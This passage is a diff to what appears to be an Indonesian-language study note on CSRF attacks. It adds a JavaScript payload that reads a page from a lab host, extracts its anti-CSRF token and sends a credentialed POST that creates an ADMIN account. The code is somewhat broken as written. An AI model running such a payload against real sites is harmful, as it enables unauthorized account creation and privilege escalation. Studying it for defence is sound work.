@@ -58,6 +58,40 @@ Cross Site Request Forgery adalah serangan yang memaksa pengguna agar backend me
     CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     CSRF.send(params);
   </script> 
+  ```  
+- XHR dengan extract token
+  ```
+  <script type="text/javascript">
+ 
+  function addUser() {
+    var url = "http://3.csrf.labs/add_user.php";
+    var params =  "name=Malice&surname=Smith&email=malice%40hacker.site&role=ADMIN&submit=&CSRFtoken=" + token;
+    var CSRF = new XMLHttpRequest();
+ 
+    CSRF.open("POST", url, true);
+    CSRF.withCredentials = 'true'; //IMPORTANTMUST!!
+    CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    CSRF.send(params);
+    }
+ 
+  // Extract the token
+  var XHR = new XMLHttpRequest();
+  
+  XHR.onreadystatechange = function(){
+    if(XHR.readyState == 4 ) {
+        var htmlSource = XHR.responseText; // the source of users.php
+
+        // Extract the token  
+        var parser = new DOMParser().parseFromString(htmlSource, "text/html");
+        var token = parser.getElementById('CSRFToken').value;
+        addUser(token);
+        }
+ 
+  XHR.open('GET', 'http://3.csrf.labs/users.php', true);
+  XHR.send();
+ 
+  </script>
+
   ```
 
 ## PREVENTION
